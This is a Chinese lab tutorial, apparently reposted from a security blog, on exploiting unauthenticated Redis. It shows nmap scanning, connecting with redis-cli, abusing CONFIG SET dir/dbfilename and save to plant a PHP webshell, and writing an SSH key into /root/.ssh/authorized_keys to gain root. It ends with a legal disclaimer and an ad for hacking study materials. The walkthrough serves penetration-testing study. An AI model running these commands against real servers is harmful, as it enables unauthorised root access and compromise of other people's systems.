# 原创
：  redis未授权访问漏洞利用

# redis未授权访问漏洞利用

当redis服务(6379)端口对外开放且未作密码认证时，任意用户可未授权访问redis服务并操作获取其数据。<br/> 攻击机：10.1.1.100 kali<br/> 目标靶机：10.1.1.200<br/> 一、探测redis的未授权访问<br/> 首先在攻击机上使用nmap对目标机进行扫描，探测开放的服务与端口。<br/> 使用全端口扫描，探测存在的服务： nmap -p- -sV 10.1.1.200

<br/> 探测到靶机开放了多个端口，其中存在redis服务的6379端口，开始尝试是否存在redis未授权访问漏洞。<br/> 下载redis连接工具，解压后使用make命令进行编译。

编译后的redis-cli文件存放在src目录中，将其复制到bin目录下，就可以在任意位置执行。

使用redis-cli工具对redis数据尝试进行连接。<br/> redis-cli -h 10.1.1.200 -p 6379

连接成功，这个地方存在一个未授权访问。

二、利用未授权访问漏洞写入一句话木马。<br/> 对之前使用nmap扫描到的80端口进行访问，发现了一个页面，判断存在web服务，尝试使用扫描工具对目录进行一个探测。

使用dirsearch工具进行目录的探测，发现还存在一个phpinfo目录。

看到了网站的根目录

利用之前已经远程连接到的redis数据库，利用写入备份文件的方式，在这个地方可以尝试写入一句话木马。<br/> config set dir &lt;路径&gt; #设置备份路径<br/> config set dbfilename &lt;文件名&gt; #设置备份文件的名字<br/> set &lt;key&gt; &lt;value&gt; #写入数据<br/> save #保存

访问目标，拿到webshell

三、利用redis未授权访问写入ssh公钥获取shell<br/> 先生成ssh的公钥，公钥文件一般保存在/root/.ssh目录下<br/> ssh-keygen -t rsa

将公钥写入到foo.txt文件中，前后使用换行，必然和其他符号连接产生其他不可预知错误。<br/> (echo -e “\n\n”; cat ~/.ssh/id_rsa.pub; echo -e “\n\n”) &gt; /tmp/foo.txt

将公钥信息写入到目标靶机<br/> cat /tmp/foo.txt | redis-cli -h 10.1.1.200 -p 6379 -x set sshkey

再一次利用备份功能写入公钥的备份文件。<br/> config set dir /root/.ssh<br/> config set dbfilename authorized_keys<br/> save

使用ssh连接方式：ssh root@10.1.1.200 -i /root/.ssh/id_rsa

<br/> 成功获取到shell。

> 
申明：本公众号所分享内容仅用于网络安全技术讨论，切勿用于违法途径，
所有渗透都需获取授权，违者后果自行承担，与本号及作者无关，请谨记守法.


**没看够~？欢迎关注！**

## **免费领取安全学习资料包！**<img alt="" height="768" src="https://img-blog.csdnimg.cn/df23362d55e84477a86315e2ecc58557.png" width="1024"/>

渗透工具

技术文档、书籍

<img alt="" height="516" src="https://img-blog.csdnimg.cn/1e4b8f2bad4b4815a72998d5905a894a.png" width="852"/> <img alt="" height="523" src="https://img-blog.csdnimg.cn/b9c9c302e6ff406dab8c21fd3d1a592f.png" width="856"/>

面试题

帮助你在面试中脱颖而出

视频

基础到进阶

环境搭建、HTML，PHP，MySQL基础学习，信息收集，SQL注入,XSS，CSRF，暴力破解等等

<img alt="" height="481" src="https://img-blog.csdnimg.cn/3c862766b62b4102b225778a3b0170ea.png" width="694"/> <img alt="" height="77" src="https://img-blog.csdnimg.cn/c315ebd13e0a481889827b66590d0382.png" width="665"/>

应急响应笔记

学习路线
